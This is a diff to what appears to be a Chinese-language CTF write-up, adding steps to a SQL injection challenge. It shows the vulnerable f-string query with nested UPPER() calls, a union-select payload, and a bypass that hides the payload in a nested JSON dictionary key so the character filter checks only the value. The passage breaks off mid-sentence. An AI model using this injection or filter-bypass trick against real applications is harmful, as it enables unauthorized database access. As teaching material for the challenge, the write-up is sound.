@@ -351,7 +351,21 @@ code = '))))))) union select LAMENTXU FROM FATETABLE--+
 所以我们需要
 ```json
 {
-	"name":"'))))))) union select LAMENTXU FROM FATETABLE--+"
+	"name":"'))))))) union select LAMENTXU FROM FATETABLE where name='LAMENTXU'--+"
 }
 ```
-但是
+但是这里`name`中又不能出现`'`、`(`，这我们要怎么构造闭合呢。
+这里学一个新的手法:
+```python
+cur.execute(f"SELECT FATE FROM FATETABLE WHERE NAME=UPPER(UPPER(UPPER(UPPER(UPPER(UPPER(UPPER('{code}')))))))")
+```
+这里`{code}`是通过`f-string`传入的，所以不管是什么都会原样传入，我们可以利用这个特性
+通过json中嵌套一层字典的形式：
+```json
+{
+	"name":{
+	           "'))))))) union select LAMENTXU FROM FATETABLE where name='LAMENTXU'--+":"1"
+	}
+}
+```
+这样检查`name`中有没有非法字符串都是检查的value，
